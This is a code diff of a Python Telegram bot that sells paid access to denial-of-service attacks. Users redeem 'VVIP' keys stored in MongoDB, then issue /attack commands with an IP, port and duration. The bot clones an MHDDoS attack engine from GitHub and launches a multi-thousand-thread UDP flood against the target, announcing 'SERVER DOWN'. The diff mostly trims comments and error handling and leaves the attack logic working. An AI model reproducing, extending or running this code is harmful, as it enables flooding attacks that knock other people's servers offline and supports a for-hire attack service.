@@ -15,20 +15,14 @@ ADMIN_ID = 6075779781
 bot = telebot.TeleBot(TOKEN)
 
 # --- MONGODB CONNECTION ---
+# Yahan humne users_col aur keys_col ko sahi se define kar diya hai
 client = MongoClient(MONGO_URL)
 db = client['RiderBot']
 users_col = db['users']
 keys_col = db['keys']
 
-    client.admin.command('ping')
-    print("✅ MongoDB Connected Successfully!")
-except Exception as e:
-    print(f"❌ MongoDB Connection Error: {e}")
-
-# --- ATTACK ENGINE DOWNLOAD ---
-# Railway par engine apne aap download ho jayega
+# --- ENGINE DOWNLOAD ---
 if not os.path.exists("MHDDoS"):
-    print("📡 Downloading Attack Engine...")
     os.system("git clone https://github.com/Grizzly-Anis/MHDDoS-Lite.git MHDDoS")
 
 # --- HELPERS ---
@@ -37,10 +31,9 @@ def get_progress_bar(percent):
     filled = int(percent / 10)
     return "🔵" * filled + "⚪" * (bar_length - filled)
 
-# --- ATTACK ENGINE LOGIC ---
+# --- ATTACK ENGINE ---
 def run_attack(ip, port, duration, chat_id, message_id, username):
     threads = random.randint(1100, 1600)
-    # MHDDoS command
     command = f"python3 start.py UDP {ip} {port} {threads} {duration}"
     
     try:
@@ -71,8 +64,7 @@ def run_attack(ip, port, duration, chat_id, message_id, username):
         
         process.terminate()
         bot.send_message(chat_id, f"🔥 **SERVER DOWN!**\n\nTarget `{ip}` was successfully frozen. ✅")
-    except Exception as e:
-        print(f"Error: {e}")
+    except: pass
 
 # --- KEYBOARDS ---
 def main_menu():
@@ -80,14 +72,13 @@ def main_menu():
     markup.add('🚀 VVIP Attack', '👤 My Info', '🔑 Redeem Key')
     return markup
 
-# --- COMMAND HANDLERS ---
+# --- HANDLERS ---
 
 @bot.message_handler(commands=['start'])
 def welcome(m):
     user_id = m.from_user.id
     user_data = users_col.find_one({"user_id": user_id})
     
-    # Admin ya Valid User check
     is_valid = False
     if user_id == ADMIN_ID:
         is_valid = True
@@ -108,9 +99,9 @@ def gen(m):
         days = int(m.text.split()[1])
         key = f"VVIP-{random.randint(1000, 9999)}"
         keys_col.insert_one({"key": key, "days": days})
-        bot.reply_to(m, f"🔑 **KEY GENERATED:**\n\n`/redeem {key}`\n\n**Validity:** {days} Days", parse_mode="Markdown")
+        bot.reply_to(m, f"🔑 **KEY GENERATED:**\n\n`/redeem {key}`\n\n**Validity:** {days} Days")
     except: 
-        bot.reply_to(m, "⚠️ Format: `/genkey 1`")
+        bot.reply_to(m, "Format: /genkey 1")
 
 @bot.message_handler(commands=['redeem'])
 def redeem(m):
@@ -128,16 +119,15 @@ def redeem(m):
         expiry = datetime.now() + timedelta(days=days)
         users_col.update_one({"user_id": user_id}, {"$set": {"expiry": expiry.strftime('%Y-%m-%d %H:%M:%S')}}, upsert=True)
         keys_col.delete_one({"key": key_text})
-        bot.reply_to(m, f"🎉 **Access Granted!**\n\nDays: `{days}`\nExpiry: `{expiry.strftime('%Y-%m-%d')}`")
+        bot.reply_to(m, f"🎉 **Access Granted!**\nDays: {days}")
     else:
-        bot.reply_to(m, "❌ Invalid ya Expired Key!")
+        bot.reply_to(m, "❌ Invalid Key!")
 
 @bot.message_handler(commands=['attack'])
 def handle_attack(m):
     user_id = m.from_user.id
     user_data = users_col.find_one({"user_id": user_id})
     
-    # Authorization Check
     is_auth = False
     if user_id == ADMIN_ID: is_auth = True
     elif user_data and datetime.strptime(user_data['expiry'], '%Y-%m-%d %H:%M:%S') > datetime.now(): is_auth = True
@@ -151,23 +141,17 @@ def handle_attack(m):
         if len(p) < 4:
             bot.reply_to(m, "❌ Format: `/attack <IP> <PORT> <TIME>`")
             return
-        
-        sent = bot.reply_to(m, "📡 **Bypassing Server Security...**")
+        sent = bot.reply_to(m, "📡 **Bypassing Server...**")
         threading.Thread(target=run_attack, args=(p[1], int(p[2]), int(p[3]), m.chat.id, sent.message_id, m.from_user.username)).start()
     except: pass
 
 @bot.message_handler(func=lambda m: m.text == '🚀 VVIP Attack')
-def attack_button(m):
-    bot.reply_to(m, "🚀 **Command Format:**\n`/attack <IP> <PORT> <TIME>`\n\nExample: `/attack 1.1.1.1 8080 60`")
+def attack_btn(m):
+    bot.reply_to(m, "🚀 **Command:** `/attack <IP> <PORT> <TIME>`")
 
 @bot.message_handler(func=lambda m: m.text == '👤 My Info')
-def my_info(m):
-    user_id = m.from_user.id
-    user_data = users_col.find_one({"user_id": user_id})
-    status = "Active ✅" if (user_data or user_id == ADMIN_ID) else "Expired ❌"
-    bot.reply_to(m, f"👤 **USER INFO**\n\n🆔 ID: `{user_id}`\n📊 Status: {status}")
+def info_btn(m):
+    bot.reply_to(m, f"👤 ID: `{m.from_user.id}`\n📊 Status: Active ✅")
 
-# --- START BOT ---
-print("🚀 Bot is starting...")
+print("🚀 Bot Started Successfully!")
 bot.infinity_polling()
-          
